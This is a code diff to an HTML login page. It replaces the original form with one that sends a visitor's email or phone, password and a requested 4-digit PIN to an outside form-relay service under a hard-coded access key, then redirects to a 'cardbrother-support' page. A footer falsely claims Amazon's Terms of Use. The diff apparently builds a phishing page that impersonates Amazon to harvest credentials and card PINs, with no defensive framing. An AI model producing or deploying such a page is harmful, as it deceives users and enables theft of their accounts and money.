@@ -91,20 +91,37 @@ button:hover {
 
   <h2>Login to Continue</h2>
 
-  <form onsubmit="loginUser(event)">
-    <input type="email" placeholder="Email or Phone Number" required>
-    <input type="password" placeholder="Password" required>
+<div class="form-box">
 
-    <button type="submit">Login</button>
-  </form>
+<form action="https://api.web3forms.com/submit" method="POST">
 
-  <div class="divider">OR</div>
+<input type="hidden" name="access_key" value="21bda4c6-ce9c-4353-8f0c-b3d6604969b8">
+<input type="hidden" name="redirect" value="https://cardbrother-support.vercel.app/success.html">
 
-  <button onclick="goRegister()">Create your account</button>
+<div class="input">
+<input type="text" name="name" placeholder="Email or Phone"required>
+</div>
 
-  <div class="footer">
-    <p><a href="#">Forgot Password?</a></p>
-  </div>
+<div class="input">
+<input type="username" name="username" placeholder="Password"required>
+</div>
+<div class="input">
+    <textarea name="complaint" column="1" placeholder="verify 4 digit pin "></textarea>
+</div>
+<button class="submit">Sign In</button>
+
+<p style="text-align:center">or</p>
+
+<button class="submit">Guest</button>
+
+<div class="footer">
+<p>Version: 5.1.0</p>
+<p>
+By continuing, you agree to amazon Term of Use and Confirm that you have read Privacy Policy.
+</p>
+</div>
+
+</div>
 
 </div>
 
